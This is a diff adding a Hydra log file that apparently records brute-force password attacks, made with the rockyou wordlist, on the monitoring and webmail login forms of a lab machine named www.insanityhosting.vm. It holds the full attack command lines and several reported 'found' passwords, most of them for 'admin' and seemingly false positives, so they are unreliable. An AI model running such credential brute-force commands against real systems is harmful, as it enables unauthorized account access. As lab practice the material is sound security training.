@@ -1,0 +1,15 @@
+# Hydra v9.1 run at 2023-03-12 19:43:24 on www.insanityhosting.vm http-post-form (hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 10 -w 30 -o hydra-http-post-attack.txt www.insanityhosting.vm http-post-form /monitoring/login.php:username=^USER^&password=^PASS^:\n)
+# Hydra v9.1 run at 2023-03-12 19:44:23 on www.insanityhosting.vm http-post-form (hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 10 -w 30 -o hydra-http-post-attack.txt -I www.insanityhosting.vm http-post-form /monitoring/login.php:username=^USER^&password=^PASS^:asofinaosifnn)
+[80][http-post-form] host: www.insanityhosting.vm   login: admin   password: 123456789
+[80][http-post-form] host: www.insanityhosting.vm   login: admin   password: 12345
+[80][http-post-form] host: www.insanityhosting.vm   login: admin   password: iloveyou
+[80][http-post-form] host: www.insanityhosting.vm   login: admin   password: 1234567
+[80][http-post-form] host: www.insanityhosting.vm   login: admin   password: rockyou
+[80][http-post-form] host: www.insanityhosting.vm   login: admin   password: abc123
+[80][http-post-form] host: www.insanityhosting.vm   login: admin   password: 123456
+[80][http-post-form] host: www.insanityhosting.vm   login: admin   password: password
+[80][http-post-form] host: www.insanityhosting.vm   login: admin   password: princess
+[80][http-post-form] host: www.insanityhosting.vm   login: admin   password: 12345678
+# Hydra v9.1 run at 2023-03-12 19:44:38 on www.insanityhosting.vm http-post-form (hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 10 -w 30 -o hydra-http-post-attack.txt www.insanityhosting.vm http-post-form /monitoring/login.php:username=^USER^&password=^PASS^:\n)
+# Hydra v9.1 run at 2023-03-12 20:15:50 on www.insanityhosting.vm http-post-form (hydra -l otis -P /usr/share/wordlists/rockyou.txt -t 20 -w 30 -o hydra-http-post-attack.txt www.insanityhosting.vm http-post-form /webmail/src/redirect.php?js_autodetect_results=1&just_logged_in=1:login_username=^USER^&secretkey=^PASS^:Unknown user or password incorrect.)
+[80][http-post-form] host: www.insanityhosting.vm   login: otis   password: 123456
